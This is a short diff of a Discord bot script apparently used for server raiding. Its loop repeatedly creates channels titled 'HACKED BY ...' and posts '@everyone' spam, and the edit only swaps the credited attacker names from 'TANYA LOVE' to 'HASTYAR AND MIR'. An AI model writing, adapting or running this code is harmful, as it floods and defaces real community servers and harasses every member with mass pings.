@@ -54,8 +54,8 @@ client.on('message', message => {
         setTimeout(function() {
             setInterval(() => {
               
-                message.guild.createChannel('HACKED BY TANYA LOVE', 'text').then(channel => { 
-                channel.send('@everyone HACK BY TANYA LOVE :joy: :joy: :joy:')
+                message.guild.createChannel('HACKED BY HASTYAR AND MIR ', 'text').then(channel => { 
+                channel.send('@everyone HACK BY HASTYAR AND MIR  :joy: :joy: :joy:')
                
                 })
             }
